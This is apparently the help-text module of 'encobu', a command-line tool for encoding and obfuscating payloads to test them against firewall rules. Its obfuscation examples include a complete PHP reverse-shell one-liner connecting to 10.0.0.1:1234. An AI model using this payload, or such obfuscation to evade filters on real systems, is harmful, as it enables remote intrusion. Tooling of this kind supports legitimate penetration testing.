class MainCommand:
    DESCRIPTION = "A modern cli tool for encoding and obfuscating your payloads and testing them against simple firewall rules"
    EPILOG = """
    EXAMPLES:
        encobu enocde [OPTIONS]
        encobu obfus [OPTIONS]
        encobu decode [OPTIONS]
    """
    SUB_PARSER_TITLE = "Modes"
    SUB_PARSER_METAVAR = "<COMMAND>"

class EncodeSubCommand:
    DESCRIPTION = "Encodes a given payload using standard encoding methods"
    HELP = "Encode a string of text using specific algorithm"
    EPILOG = """
    EXAMPLES:
        BASIC ENCODING
        encobu encode "ls -al" -m xor -k pizzatime 
        encobu encode "echo $SHELL" -m b64
        encobu encode whoami -m rot13

        encobu encode "ls -al" -m rotb64 [Base64 + ROT13 Encoding]
        encobu encode "echo $SHELL" -m xorot64 [XOR + Base64 + ROT13 Encoding]
    """

    PAYLOAD_HELP = "The payload you want to encode using different methods"
    PAYLOAD_METAVAR = "<PAYLOAD>"

    FILE_HELP = "The file you want to encode using different methods"
    FILE_METAVAR = "<FILE>"

    METHOD_HELP = "The encoding algorithm to use (choices: %(choices)s)"
    METHOD_METAVAR = "<METHOD>"

    KEY_HELP = "The encryption key is required when the method is XOR"
    KEY_METAVAR = "<SECRET_KEY>"

class ObfusSubCommand:
    DESCRIPTION = "Obfuscates the payload using string manipulation and obfuscation algorithms"
    HELP = "Obfuscate your payload using specific algorithms"
    EPILOG = """
    EXAMPLES:
        encobu obfus -p "php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'" -a rci
        encobu obfus -f hack.txt -a rci
    """

    PAYLOAD_HELP = "The payload you want to obfuscate using different algorithms"
    PAYLOAD_METAVAR = "<PAYLOAD>"

    FILE_HELP = "The file you want to obfuscate using different algorithms"
    FILE_METAVAR = "<FILE>"

    ALGO_HELP = "The obfuscation algorithm to use (choices: %(choices)s)"
    ALGO_METAVAR = "<ALGORITHM>"

    STRIDE_HELP = "Step size for character insertion (default: %(default)s)"
    STRIDE_METAVAR = "<STRIDE>"

    NOISE_LEN_HELP = "Number of characters to be inserted (default: %(default)s)"
    NOISE_LEN_METAVAR = "<NOISE_LENGTH>"

    OPERATOR_HELP = "Concatenation operator to be used with Split and Concatenation algorithm (default: %(default)s)"
    OPERATOR_METAVAR = "<OPERATOR>"

    ESCAPE_TYPE_HELP = "Escape sequence to use (default: %(default)s)(choices: %(choices)s)"
    ESCAPE_TYPE_METAVAR = "<ESCAPE_TYPE>"

    POLY_HELP = "Enables polymorphic escaping for escape-sequence algorithm"

class DecodingCommand:
    DESCRIPTION = "Decodes a given payload or a file using standard decoding methods"
    HELP = "Decodes a given payload or file using specified method"
    EPILOG = """
        EXMAPLES:
            encobu decode -P "bHMgLWFs" -m b64
            encobu decode -F decode.txt -m b64-rot13
            encobu decode -P "BQRBQxUc" -m xor -k iwantpizza

            ADVANCED METHODS:
                encobu decode -P "oUZtYJSf" -m b64-rot13
                encobu decode -P "ODEODkHp" -m xor-b64-rot13 -k iwantpizza
    """
    PAYLOAD_HELP = "The payload you want to decode using different methods"
    PAYLOAD_METAVAR = "<PAYLOAD>"

    FILE_HELP = "The file you want to decode using different methods"
    FILE_METAVAR = "<FILE>"

    METHOD_HELP = "The decoding algorithm to use (choices: %(choices)s)"
    METHOD_METAVAR = "<METHOD>"

    KEY_HELP = "The encryption key is required when the method is XOR"
    KEY_METAVAR = "<SECRET_KEY>"

